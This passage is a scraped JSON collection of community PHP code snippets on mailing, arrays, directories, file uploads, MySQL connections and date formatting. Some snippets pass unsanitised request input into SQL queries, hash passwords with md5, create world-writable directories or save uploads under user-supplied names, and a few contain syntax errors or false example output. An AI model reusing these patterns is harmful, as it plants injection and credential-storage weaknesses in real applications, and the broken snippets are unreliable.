recipient $mail->addAddress('ellen@example.com');               // Name is optional $mail->addReplyTo('info@example.com', 'Information'); $mail->addCC('cc@example.com'); $mail->addBCC('bcc@example.com');  $mail->addAttachment('/var/tmp/file.tar.gz');         // Add attachments $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name $mail->isHTML(true);                                  // Set email format to HTML  $mail->Subject = 'Here is the subject'; $mail->Body    = 'This is the HTML message body <b>in bold!</b>'; $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';  if(!$mail->send()) {     echo 'Message could not be sent.';     echo 'Mailer Error: ' . $mail->ErrorInfo; } else {     echo 'Message has been sent'; }\n<?php //Import PHPMailer classes into the global namespace //These must be at the top of your script, not inside a function use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\SMTP; use PHPMailer\\PHPMailer\\Exception;  //Load Composer's autoloader require 'vendor/autoload.php';  //Instantiation and passing `true` enables exceptions $mail = new PHPMailer(true);  try {     //Server settings     $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output     $mail->isSMTP();                                            //Send using SMTP     $mail->Host       = 'smtp.example.com';                     //Set the SMTP server to send through     $mail->SMTPAuth   = true;                                   //Enable SMTP authentication     $mail->Username   = 'user@example.com';                     //SMTP username     $mail->Password   = 'secret';                               //SMTP password     $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged     $mail->Port       = 587;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above      //Recipients     $mail->setFrom('from@example.com', 'Mailer');     $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient     $mail->addAddress('ellen@example.com');               //Name is optional     $mail->addReplyTo('info@example.com', 'Information');     $mail->addCC('cc@example.com');     $mail->addBCC('bcc@example.com');      //Attachments     $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments     $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name      //Content     $mail->isHTML(true);                                  //Set email format to HTML     $mail->Subject = 'Here is the subject';     $mail->Body    = 'This is the HTML message body <b>in bold!</b>';     $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';      $mail->send();     echo 'Message has been sent'; } catch (Exception $e) {     echo \"Message could not be sent. Mailer Error: {$mail->ErrorInfo}\"; }\ncomposer require phpmailer/phpmailer\n<?php use PHPMailer\\PHPMailer\\PHPMailer; use PHPMailer\\PHPMailer\\Exception;  require_once \"vendor/autoload.php\";  //PHPMailer Object $mail = new PHPMailer(true); //Argument true in constructor enables exceptions  //From email address and name $mail->From = \"from@yourdomain.com\"; $mail->FromName = \"Full Name\";  //To address and name $mail->addAddress(\"recepient1@example.com\", \"Recepient Name\"); $mail->addAddress(\"recepient1@example.com\"); //Recipient name is optional  //Address to which recipient will reply $mail->addReplyTo(\"reply@yourdomain.com\", \"Reply\");  //CC and BCC $mail->addCC(\"cc@example.com\"); $mail->addBCC(\"bcc@example.com\");  //Send HTML or Plain Text email $mail->isHTML(true);  $mail->Subject = \"Subject Text\"; $mail->Body = \"<i>Mail body in HTML</i>\"; $mail->AltBody = \"This is the plain text version of the email content\";  try {     $mail->send();     echo \"Message has been sent successfully\"; } catch (Exception $e) {     echo \"Mailer Error: \" . $mail->ErrorInfo; } \nphp mailer\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3870,
    "keyword": null,
    "link": null,
    "title": " php make array to certain length",
    "description": "#trim array to certain legnth $alphabet = [\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"]; $alphabetFirst10 = array_slice($alphabet, 0, 10);\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3871,
    "keyword": null,
    "link": null,
    "title": " php mascara cep",
    "description": "function Mask($mask,$str){      $str = str_replace(\" \",\"\",$str);      for($i=0;$i<strlen($str);$i++){         $mask[strpos($mask,\"#\")] = $str[$i];     }      return $mask;  }  $cnpj = '17804682000198'; echo Mask(\"##.###.###/####-##\",$cnpj).'<BR>';  $cpf = '21450479480'; echo Mask(\"###.###.###-##\",$cpf).'<BR>';  $cep = '36970000'; echo Mask(\"#####-###\",$cep).'<BR>';  $telefone = '3391922727'; echo Mask(\"(##)####-####\",$telefone).'<BR>';  $data = '21072014'; echo Mask(\"##/##/####\",$data); \n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3872,
    "keyword": null,
    "link": null,
    "title": " php max execution time",
    "description": "ini_set ( 'max_execution_time', -1); //unlimit\nini_set ( 'max_execution_time', 1200); //1200 is time in secondss\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3873,
    "keyword": null,
    "link": null,
    "title": " php max input vars",
    "description": "max_input_vars = 3000\nhtaccess --> php_value max_input_vars 3000 .php     --> ini_set('max_input_vars', 3000); \n@ini_set( 'max_input_vars' , 4000 );\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3874,
    "keyword": null,
    "link": null,
    "title": " php max input vars wordpress wp-config",
    "description": "@ini_set( 'max_input_vars' , 3000 );\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3875,
    "keyword": null,
    "link": null,
    "title": " php maxupload",
    "description": "; Maximum allowed size for uploaded files. upload_max_filesize = 40M  ; Must be greater than or equal to upload_max_filesize post_max_size = 40M\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3876,
    "keyword": null,
    "link": null,
    "title": " php mb convert case",
    "description": " <?php $str = \"mary had a Little lamb and she loved it so\"; $str = mb_convert_case($str, MB_CASE_UPPER, \"UTF-8\"); echo $str; // Prints MARY HAD A LITTLE LAMB AND SHE LOVED IT SO $str = mb_convert_case($str, MB_CASE_TITLE, \"UTF-8\"); echo $str; // Prints Mary Had A Little Lamb And She Loved It So ?>  \nyou have to enable mbstring to use the multi bytes functions go to this website and follow the instructions : https://www.knowledgebase-script.com/kb/article/how-to-enable-mbstring-in-php-46.html\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3877,
    "keyword": null,
    "link": null,
    "title": " php md5",
    "description": "<?php // md5(string, raw)\t\t\t\traw (boolean) is optional   $str = \"Hello\";   echo md5($str); // md5_file(file, raw)\t\t\traw (boolean) is optional   $filename = \"test.txt\";   $md5file = md5_file($filename);   echo $md5file; ?> \n$pswd = md5($_POST['pswd']);\n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3878,
    "keyword": null,
    "link": null,
    "title": " php md5 encrypt",
    "description": "<?php  $str = \"Hello\";  echo md5($str);  ?> \n",
    "reg_date": "2021-10-12T10:18:45.000Z"
  },
  {
    "id": 3879,
    "keyword": null,
    "link": null,
    "title": " php memory limit cli",
    "description": "php -d memory_limit=-1\n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3880,
    "keyword": null,
    "link": null,
    "title": " php memory limit unlimited",
    "description": "//Unlimited momory limit ini_set('memory_limit', '-1');  //Fixed memory limit ini_set('memory_limit','2048M');\n/* To increase the PHP memory limit setting, edit your PHP.ini file found under /usr/local/etc/php/7.4/. Increase the default value (example: Maximum amount of memory a script may consume = 128MB) of the PHP memory limit line in php.ini. */  memory_limit = 256M\n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3881,
    "keyword": null,
    "link": null,
    "title": " php merge 2 arrays",
    "description": " <?php $array1 = array(\"color\" => \"red\", 2, 4); $array2 = array(\"a\", \"b\", \"color\" => \"green\", \"shape\" => \"trapezoid\", 4); $result = array_merge($array1, $array2); print_r($result); ?> Array (     [color] => green     [0] => 2     [1] => 4     [2] => a     [3] => b     [shape] => trapezoid     [4] => 4 ) \n<?php   $array1 = [       \"color\" => \"green\"   ];   $array2 = [       \"color\" => \"red\",        \"color\" => \"blue\"   ];   $result = array_merge($array1, $array2); ?>  // $result [     \"color\" => \"green\"     \"color\" => \"red\",      \"color\" => \"blue\" ]\n$output = array_merge($array1, $array2);\n/* Array merge is basically use to merge the two array data. */    <?php $a1=array(\"red\",\"green\"); $a2=array(\"blue\",\"green\",\"yellow\"); print_r(array_merge($a1,$a2)); ?>    /* Output: Array ( [0] => red [1] => green [2] => blue [3] => green [4] => yellow ) */    <?php $a1=array(\"a\"=>\"red\",\"b\"=>\"green\"); $a2=array(\"c\"=>\"blue\",\"b\"=>\"yellow\"); print_r(array_merge($a1,$a2)); ?>  /* Output: Array ( [a] => red [b] => yellow [c] => blue ) */    /* In above example you can check the difference in output  it takes all values of both array in final output, but not in associative array you can check. because one value gets overwritten by same key reference in both array. */ \nfunction custom_array_merge(&$array1, &$array2) {     $result = Array();     foreach ($array1 as $key_1 => &$value_1) {         // if($value['name'])         foreach ($array2 as $key_1 => $value_2) {             if($value_1['name'] ==  $value_2['name']) {                 $result[] = array_merge($value_1,$value_2);             }         }      }     return $result; }\narray_merge ([ array $... ] ) : array\n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3882,
    "keyword": null,
    "link": null,
    "title": " php merge array with same value",
    "description": "<?php   $array1 = [       \"color\" => \"green\"   ];   $array2 = [       \"color\" => \"red\",        \"color\" => \"blue\"   ];   $result = array_merge($array1, $array2); ?>  // $result [     \"color\" => \"green\"     \"color\" => \"red\",      \"color\" => \"blue\" ]\nfunction custom_array_merge(&$array1, &$array2) {     $result = Array();     foreach ($array1 as $key_1 => &$value_1) {         // if($value['name'])         foreach ($array2 as $key_1 => $value_2) {             if($value_1['name'] ==  $value_2['name']) {                 $result[] = array_merge($value_1,$value_2);             }         }      }     return $result; }\n$all_arrays = array_merge($array1, $array2, $array3, ...);\nInput : $a1=array(\"a\"=>\"raj\", \"b\"=>\"striver\");         $a2=array(\"z\"=>\"geeks\", \"b\"=>\"articles\"); Output :  Array (     [a] => raj     [b] => Array         (             [0] => striver             [1] => articles         )      [z] => geeks )\n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3883,
    "keyword": null,
    "link": null,
    "title": " php method description",
    "description": "/**  * Does something interesting  *  * @param Place   $where  Where something interesting takes place  * @param integer $repeat How many times something interesting should happen  *   * @throws Some_Exception_Class If something interesting cannot happen  * @author Monkey Coder <mcoder@facebook.com>  * @return Status  */  \n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3884,
    "keyword": null,
    "link": null,
    "title": " php microtime to seconds",
    "description": "echo date(\"H:i:s\",$endtime-$starttime);  $duration = $endtime-$starttime; $hours = (int)($duration/60/60); $minutes = (int)($duration/60)-$hours*60; $seconds = (int)$duration-$hours*60*60-$minutes*60;\n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3885,
    "keyword": null,
    "link": null,
    "title": " php migrate",
    "description": "Try: composer dump-autoload php artisan config:cache  If not working also try: php artisan migrate:refresh.\nphp artisan migrate:rollback\nphp artisan make:migration create_person_table\n// use the make:migration Artisan command to generate a database migration php artisan make:migration create_flights_table  // use --create to indicate whether the migration will be creating a new table php artisan make:migration create_flights_table --create=flights  // use --table to indicate the table name php artisan make:migration add_destination_to_flights_table --table=flights\n$ php artisan migrate:fresh  Dropped all tables successfully. Migration table created successfully. Migrating: 2014_10_12_000000_create_users_table Migrated:  2014_10_12_000000_create_users_table Migrating: 2014_10_12_100000_create_password_resets_table Migrated:  2014_10_12_100000_create_password_resets_table \nphp artisan migrate:status\n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3886,
    "keyword": null,
    "link": null,
    "title": " php migrate comand",
    "description": "php artisan make:migration create_person_table\n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3887,
    "keyword": null,
    "link": null,
    "title": " php milliseconds",
    "description": "//Timing executation time of script $startTime = microtime(true); //get time in micro seconds(1 millionth) usleep(250);  $endTime = microtime(true);  echo \"milliseconds to execute:\". ($endTime-$startTime)*1000;\n$d = new DateTime(); echo $d->format(\"Y-m-d H:i:s.v\"); // v : Milliseconds \n",
    "reg_date": "2021-10-12T10:18:46.000Z"
  },
  {
    "id": 3888,
    "keyword": null,
    "link": null,
    "title": " php mixing 2 string",
    "description": "<?php $a = \"Hello \"; $b = $a . \"World!\"; // now $b contains \"Hello World!\"  $a = \"Hello \"; $a .= \"World!\";     // now $a contains \"Hello World!\"\n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3889,
    "keyword": null,
    "link": null,
    "title": " php mkdir",
    "description": "// Create a directory with the permission level (optional) <?php mkdir(\"/path/to/my/dir\", 0700); ?>\n<?php // Create a directory recursively (make sure to sanitize if taken from input as always!) mkdir(\"/path/to/my/dir\", 0777, true);\n <?php // Desired directory structure $structure = './depth1/depth2/depth3/';  // To create the nested structure, the $recursive parameter  // to mkdir() must be specified.  if (!mkdir($structure, 0777, true)) {     die('Failed to create directories...'); }  // ... ?>  \n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3890,
    "keyword": null,
    "link": null,
    "title": " php mkdir if not exists",
    "description": "// Create folder if not exist \t\t$folderName = 'images/gallery'; \t\t$config['upload_path'] = $folderName; \t\tif(!is_dir($folderName)) \t\t{ \t\t\tmkdir($folderName, 0777); \t\t}\n<?php if (!file_exists('path/to/directory')) {   \t/**      * 0755 - Permission      * true - recursive?      */     mkdir('path/to/directory', 0755, true); }\n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3891,
    "keyword": null,
    "link": null,
    "title": " php mkdir recursive",
    "description": "// Create a directory with the permission level (optional) <?php mkdir(\"/path/to/my/dir\", 0700); ?>\n<?php // Create a directory recursively (make sure to sanitize if taken from input as always!) mkdir(\"/path/to/my/dir\", 0777, true);\n<?php // Desired directory structure $structure = './depth1/depth2/depth3/';  // To create the nested structure, the $recursive parameter  // to mkdir() must be specified.  if (!mkdir($structure, 0777, true)) {     die('Failed to create directories...'); } \n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3892,
    "keyword": null,
    "link": null,
    "title": " php mkdir with 777 permission",
    "description": "$oldmask = umask(0); mkdir(\"test\", 0777); umask($oldmask);\n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3893,
    "keyword": null,
    "link": null,
    "title": " php modify csv file",
    "description": "$myfile = 'sample_csv.csv';  $fin = fopen($myfile, 'r'); $data = array();     /***********    * header row    */ $data[] = fgetcsv($fin, 1000);   /***********    * data rows    */ while ($line = fgetcsv($fin, 1000)) {    echo join(', ', $line).'<br>';    for($i = 4, $k = count($line); $i < $k; $i++) {     if ($line[$i] < 1000) { \t    $line[$i] = 10000;     }    }    $data[] = $line; }  fclose($fin);    /******************    * reopen file and    * write array to file    */ $fout = fopen($myfile, 'w'); foreach ($data as $line) {    fputcsv($fout, $line); } fclose($fout);\n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3894,
    "keyword": null,
    "link": null,
    "title": " php modules list ubuntu",
    "description": "php -m\n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3895,
    "keyword": null,
    "link": null,
    "title": " php money format currency symbol",
    "description": " <?php  $number = 1234.56;  // let's print the international format for the en_US locale setlocale(LC_MONETARY, 'en_US'); echo money_format('%i', $number) . \"\\n\"; // USD 1,234.56  // Italian national format with 2 decimals` setlocale(LC_MONETARY, 'it_IT'); echo money_format('%.2n', $number) . \"\\n\"; // Eu 1.234,56  // Using a negative number $number = -1234.5672;  // US national format, using () for negative numbers // and 10 digits for left precision setlocale(LC_MONETARY, 'en_US'); echo money_format('%(#10n', $number) . \"\\n\"; // ($        1,234.57)  // Similar format as above, adding the use of 2 digits of right // precision and '*' as a fill character echo money_format('%=*(#10.2n', $number) . \"\\n\"; // ($********1,234.57)  // Let's justify to the left, with 14 positions of width, 8 digits of // left precision, 2 of right precision, without the grouping character // and using the international format for the de_DE locale. setlocale(LC_MONETARY, 'de_DE'); echo money_format('%=*^-14#8.2i', 1234.56) . \"\\n\"; // Eu 1234,56****  // Let's add some blurb before and after the conversion specification setlocale(LC_MONETARY, 'en_GB'); $fmt = 'The final value is %i (after a 10%% discount)'; echo money_format($fmt, 1234.56) . \"\\n\"; // The final value is  GBP 1,234.56 (after a 10% discount)  ?>  \n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3896,
    "keyword": null,
    "link": null,
    "title": " php move file",
    "description": "//Use the rename() function. rename('first_location/image1.jpg', 'new_location/image1.jpg');\nmove_uploaded_file(file_path, moved_path) \n",
    "reg_date": "2021-10-12T10:18:47.000Z"
  },
  {
    "id": 3897,
    "keyword": null,
    "link": null,
    "title": " php move uploaded file",
    "description": "//Use the rename() function. rename('first_location/image1.jpg', 'new_location/image1.jpg');\n$upload_folder = \"upload/\"; $file_location = $upload_folder . basename($_FILES[\"fileToUpload\"][\"name\"]);       if(isset($_FILES['fileToUpload'])){           if(move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $file_location)){                          echo 'Files has uploaded';          };       } \n<?php    if (move_uploaded_file($_FILES['userfile']['tmp_name'], \"/documents/new/\")) {       print \"Uploaded successfully!\";    } else {       print \"Upload failed!\";    } ?>\n <?php $uploads_dir = '/uploads'; foreach ($_FILES[\"pictures\"][\"error\"] as $key => $error) {     if ($error == UPLOAD_ERR_OK) {         $tmp_name = $_FILES[\"pictures\"][\"tmp_name\"][$key];         // basename() may prevent filesystem traversal attacks;         // further validation/sanitation of the filename may be appropriate         $name = basename($_FILES[\"pictures\"][\"name\"][$key]);         move_uploaded_file($tmp_name, \"$uploads_dir/$name\");     } } ?>  \nmove_uploaded_file ( string $filename , string $destination ) : bool\nmove_uploaded_file(file_path, moved_path) \n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3898,
    "keyword": null,
    "link": null,
    "title": " php multidimensional array get all values by key",
    "description": "$ids = array_column($users, 'id');\n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3899,
    "keyword": null,
    "link": null,
    "title": " php multiple line string",
    "description": "//use EOD function for multiple line variable $variable=<<<EOD   this is line1   this is line2   EOD; \nphpCopy<?php $mystring1 = \"This is the first line.\" . PHP_EOL; $mystring2 = \"This is the second line\" . PHP_EOL; $mystring3 = \"This is the third line\" . PHP_EOL; $mystring4 = \"This is the fourth line\" . PHP_EOL; $mystring5 = \"This is the fifth line\"; $mystring1 .= $mystring2 .= $mystring3 .= $mystring4 .= $mystring5; echo($mystring1); ?> \nphpCopy<?php $mystring1 = \"This is the first line.\" . PHP_EOL; $mystring2 = \"This is the second line\"; $mystring1 .= $mystring2; echo($mystring1); ?> \nphpCopy<?php echo(\"This is the first line \\n\\nThis is the third line\"); ?> \n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3900,
    "keyword": null,
    "link": null,
    "title": " php multiplication",
    "description": "$product = $num1 * $num2;\n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3901,
    "keyword": null,
    "link": null,
    "title": " php myadmin reset auto incremente",
    "description": "ALTER TABLE table_name AUTO_INCREMENT=0\n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3902,
    "keyword": null,
    "link": null,
    "title": " php mysql connect",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n$servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\";   Simplified  $conn = mysqli_connect('localhost', 'username', 'password'); $database = mysqli_select_db($conn, 'database');\n<?php     $user = \"username\";     $pass = \"password\";     $host = \"host\";     $dbdb = \"database\";      $conn = new mysqli($host, $user, $pass, $dbdb);    if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); }  ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  // Create connection $conn = new mysqli($servername, $username, $password);  // Check connection if ($conn->connect_error) {     die(\"Connection failed: \" . $conn->connect_error); } echo \"Connected successfully\"; ?>\n$host = 'localhost'; // URL to the server $user = 'root'; // Username (xampp = root) $pw = ''; // Password (xampp = ) $dbname = 'database'; // The name of your database  $dsn = \"mysql:host=$host;dbname=$dbname\"; $options = [PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES utf8']; // If you want to use utf-8 use this line  $db = new PDO($dsn, $user, $pw, $options); // Database Object $db -> setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); // Use this if you want an associate array // $db -> setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC); Use this if you want an indexed array  $qry = 'select * from table;'; // Your query $result = $db -> query($qry); // execute query  while ($row = $result -> fetch()) {     $id = $row[/*column-name*/]; }\n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3903,
    "keyword": null,
    "link": null,
    "title": " php mysql date",
    "description": "date(\"Y-m-d H:i:s\")\n$phpdate = strtotime( $mysqldate ); $mysqldate = date( 'Y-m-d H:i:s', $phpdate ); \n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3904,
    "keyword": null,
    "link": null,
    "title": " php mysql date format",
    "description": "date(\"Y-m-d H:i:s\")\n$phpdate = strtotime( $mysqldate ); $mysqldate = date( 'Y-m-d H:i:s', $phpdate ); \n$myDateTime = DateTime::createFromFormat('Y-m-d', $dateString); $newDateString = $myDateTime->format('d-m-Y'); \ndate('m/d/Y h:i:s a',strtotime($val['EventDateTime'])); \n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3905,
    "keyword": null,
    "link": null,
    "title": " php mysql datetime",
    "description": "date(\"Y-m-d H:i:s\")\n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3906,
    "keyword": null,
    "link": null,
    "title": " php mysql datetime format string",
    "description": "$phpdate = strtotime( $mysqldate ); $mysqldate = date( 'Y-m-d H:i:s', $phpdate ); \n",
    "reg_date": "2021-10-12T10:18:48.000Z"
  },
  {
    "id": 3907,
    "keyword": null,
    "link": null,
    "title": " php mysql error",
    "description": "mysqli_query($this->db_link, $query) or die(mysqli_error($this->db_link));  # mysqli_query($link,$query) returns 0 if there's an error. # mysqli_error($link) returns a string with the last error message\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3908,
    "keyword": null,
    "link": null,
    "title": " php mysql if exists",
    "description": "$mysqli = new mysqli(SERVER, DBUSER, DBPASS, DATABASE); $result = $mysqli->query(\"SELECT id FROM mytable WHERE city = 'c7'\"); if($result->num_rows == 0) {      // row not found, do stuff... } else {     // do other stuff... } $mysqli->close();\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3909,
    "keyword": null,
    "link": null,
    "title": " php mysql if not exists insert",
    "description": "$mysqli = new mysqli(SERVER, DBUSER, DBPASS, DATABASE); $result = $mysqli->query(\"SELECT id FROM mytable WHERE city = 'c7'\"); if($result->num_rows == 0) {      // row not found, do stuff... } else {     // do other stuff... } $mysqli->close();\nINSERT INTO table_name (firstname, lastname) SELECT 'NEW FIRSTNAME', 'NEW LASTNAME' FROM DUAL WHERE NOT EXISTS(     SELECT 1     FROM table_name     WHERE firstname = 'NEW FIRSTNAME' AND lastname = 'NEW LASTNAME' ) LIMIT 1;\nINSERT IGNORE INTO companies     (id, full_name, address, phone_number) VALUES     (1, 'Apple', '1 Infinite Loop, Cupertino, California', 18002752273); \nINSERT IGNORE INTO `transcripts` SET `ensembl_transcript_id` = 'ENSORGT00000000001', `transcript_chrom_start` = 12345, `transcript_chrom_end` = 12678;\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3910,
    "keyword": null,
    "link": null,
    "title": " php mysql insert timestamp now",
    "description": "$update_query = \"UPDATE db.tablename SET insert_time=now() WHERE username='\" .$somename . \"'\"; \n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3911,
    "keyword": null,
    "link": null,
    "title": " php mysql insert variables into database",
    "description": "<?php /* Attempt MySQL server connection. Assuming you are running MySQL server with default setting (user 'root' with no password) */ $mysqli = new mysqli(\"localhost\", \"root\", \"\", \"demo\");   // Check connection if($mysqli === false){     die(\"ERROR: Could not connect. \" . $mysqli->connect_error); }   // Escape user inputs for security $first_name = $mysqli->real_escape_string($_REQUEST['first_name']); $last_name = $mysqli->real_escape_string($_REQUEST['last_name']); $email = $mysqli->real_escape_string($_REQUEST['email']);   // Attempt insert query execution $sql = \"INSERT INTO persons (first_name, last_name, email) VALUES ('$first_name', '$last_name', '$email')\"; if($mysqli->query($sql) === true){     echo \"Records inserted successfully.\"; } else{     echo \"ERROR: Could not able to execute $sql. \" . $mysqli->error; }   // Close connection $mysqli->close(); ?>\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3912,
    "keyword": null,
    "link": null,
    "title": " php mysql pdo connection",
    "description": "<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\"; $dbname = \"myDB\";  // Create connection $conn= mysqli_connect($servername,$username,$password,$dbname); // Check connection if (!$conn) {   die(\"Connection failed: \" . mysqli_connect_error()); } echo \"Connected Successfully.\"; ?>\n<?php $servername = \"localhost\"; $username = \"username\"; $password = \"password\";  try {     $conn = new PDO(\"mysql:host=$servername;dbname=myDB\", $username, $password);     // set the PDO error mode to exception     $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);     echo \"Connected successfully\";     } catch(PDOException $e)     {     echo \"Connection failed: \" . $e->getMessage();     } ?>\n$host     = \"localhost\";//Ip of database, in this case my host machine     $user     = \"root\";\t//Username to use $pass     = \"qwerty\";//Password for that user $dbname   = \"DB\";//Name of the database  try {     $connection = new PDO(\"mysql:host=$host;dbname=$dbname\", $user, $pass);     $connection->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  }catch(PDOException $e) {   echo $e->getMessage();                          }\npublic static function connexionBDD()     {         $base = null;          try {             $base = new PDO('mysql:host=' . MYSQL_HOSTNAME . '; dbname=' . MYSQL_DATABASE . '', MYSQL_USERNAME, MYSQL_PASSWORD);         } catch (exception $e) {             die('Erreur ' . $e->getMessage());         }          return $base;     }\n<?php     \t$pdo = new PDO('mysql:host=localhost;   \t\t\t\tdbname=the_name_of_your_databe,   \t\t\t\t'username',                  'password''); # by default your username is root  # if you don't have a password don't fill in it  #(optional) :  \t$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); \t$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);  ?>\n<?php $pdo = new PDO('mysql:host=localhost;dbname=databasename', 'username', 'password'); ?> \n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3913,
    "keyword": null,
    "link": null,
    "title": " php mysql prepare query",
    "description": "$stmt = $mysqli->prepare(\"SELECT * FROM myTable WHERE name = ? AND age = ?\"); $stmt->bind_param(\"si\", $_POST['name'], $_POST['age']); $stmt->execute(); $stmt->close();\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3914,
    "keyword": null,
    "link": null,
    "title": " php mysql search database and display results",
    "description": "<?php     $con= new mysqli(\"localhost\",\"root\",\"\",\"Employee\");     $name = $_post['search'];     //$query = \"SELECT * FROM employees    // WHERE first_name LIKE '%{$name}%' OR last_name LIKE '%{$name}%'\";      // Check connection     if (mysqli_connect_errno())       {       echo \"Failed to connect to MySQL: \" . mysqli_connect_error();       }  $result = mysqli_query($con, \"SELECT * FROM employees     WHERE first_name LIKE '%{$name}%' OR last_name LIKE '%{$name}%'\");  while ($row = mysqli_fetch_array($result)) {         echo $row['first_name'] . \" \" . $row['last_name'];         echo \"<br>\"; }     mysqli_close($con);     ?>\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3915,
    "keyword": null,
    "link": null,
    "title": " php mysql timestamp format",
    "description": "date(\"Y-m-d H:i:s\", strtotime($_POST['timestamp']));\ndate(\"d.m.Y\", strtotime($mysqltimestamp)\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3916,
    "keyword": null,
    "link": null,
    "title": " php mysqli connect err0r",
    "description": "<?php $link = mysqli_connect('localhost', 'fake_user', 'my_password', 'my_db');  if (!$link) {     die('Connect Error: ' . mysqli_connect_error()); } ?>   //The mysqli_connect_error() will return a list of connection error(s) if the connection to the db fails\n",
    "reg_date": "2021-10-12T10:18:49.000Z"
  },
  {
    "id": 3917,
    "keyword": null,
    "link": null,
    "title": " php mysqli fetch all",
